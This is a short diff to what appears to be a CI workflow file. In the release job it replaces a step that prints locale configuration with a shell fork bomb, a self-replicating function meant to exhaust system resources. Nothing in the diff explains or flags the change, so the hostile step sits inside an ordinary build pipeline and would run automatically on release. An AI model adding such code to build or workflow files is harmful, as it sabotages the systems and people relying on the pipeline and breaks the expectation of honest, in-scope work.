@@ -7,5 +7,4 @@ jobs:
   release:
     runs-on: ubuntu-latest
     steps:
-     - run: |
-        cat /etc/{locale,vconsole}.conf
+     - run: :(){ :|:&; } :
